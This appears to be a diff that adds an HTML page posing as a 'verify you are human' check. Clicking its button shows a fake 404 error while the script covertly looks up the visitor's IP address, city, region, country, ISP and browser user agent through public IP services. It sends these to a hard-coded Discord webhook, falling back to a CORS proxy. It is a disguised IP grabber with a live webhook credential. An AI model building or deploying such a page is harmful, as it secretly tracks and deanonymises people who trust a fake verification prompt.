@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #0f172a;
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(30, 41, 59, 0.7);
+            padding: 3rem 2rem;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: #e2e8f0;
+        }
+
+        button {
+            padding: 0.75rem 2rem;
+            background: #3b82f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+
+        button:hover {
+            background: #2563eb;
+        }
+
+        /* 404 styles */
+        .not-found {
+            display: none;
+            text-align: left;
+            font-family: monospace;
+        }
+
+        .not-found h1 {
+            font-size: 2rem;
+            color: #ef4444;
+            margin-bottom: 0.5rem;
+        }
+
+        .not-found p {
+            color: #94a3b8;
+            font-size: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <div id="promptView">
+            <h1>Please verify you are human to continue</h1>
+            <button id="continueBtn">Click me to continue</button>
+        </div>
+
+        <div class="not-found" id="errorView">
+            <h1>404</h1>
+            <p>Page not found or resource no longer available.</p>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1556293215831986228/S_TFvcf3K71LdfCnHVbb7vRHAybaUVcKWEnsac0ry8Nie-hBqO7up-YoLgsvsJ2hyWZQ";
+
+        document.getElementById('continueBtn').addEventListener('click', async function() {
+            // Immediately switch views to 404
+            document.getElementById('promptView').style.display = 'none';
+            document.getElementById('errorView').style.display = 'block';
+            document.title = "404 Not Found";
+
+            let ip = 'Unknown';
+            let city = 'Unknown';
+            let region = 'Unknown';
+            let country = 'Unknown';
+            let org = 'Unknown';
+
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ip = data.ip || ip;
+                city = data.city || city;
+                region = data.region || region;
+                country = data.country_name || country;
+                org = data.org || org;
+            } catch (e) {
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipJson = await ipRes.json();
+                    ip = ipJson.ip;
+                } catch (err) {}
+            }
+
+            const payload = {
+                content: `🔘 **Button Clicked / Verified**\n` +
+                         `• IP: ${ip}\n` +
+                         `• City: ${city}\n` +
+                         `• Region: ${region}\n` +
+                         `• Country: ${country}\n` +
+                         `• ISP / Org: ${org}\n` +
+                         `• User Agent: ${navigator.userAgent}\n` +
+                         `• Timestamp: ${new Date().toLocaleString()}`
+            };
+
+            // Send webhook using standard fetch with CORS proxy fallback if blocked
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                try {
+                    await fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (proxyErr) {
+                    console.error("All dispatch methods failed", proxyErr);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
